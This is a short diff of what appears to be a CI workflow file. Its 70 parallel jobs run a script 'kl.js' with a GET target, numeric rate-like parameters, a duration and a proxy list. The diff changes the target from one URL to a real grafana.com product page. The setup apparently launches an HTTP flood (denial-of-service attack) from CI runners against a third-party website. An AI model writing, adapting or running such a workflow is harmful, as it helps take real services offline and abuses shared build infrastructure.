@@ -41,7 +41,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main 
           cd Fc-main 
-          node kl.js GET https://rapidis.gay/6901966783-aec69dd3-412a-401c-87b1-98097d902085 400 4 120 proxy.txt
+          node kl.js GET https://grafana.com/products/cloud/ai-tools-for-observability/?pg=hp&plcmt=hero-slide-3 400 4 120 proxy.txt
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
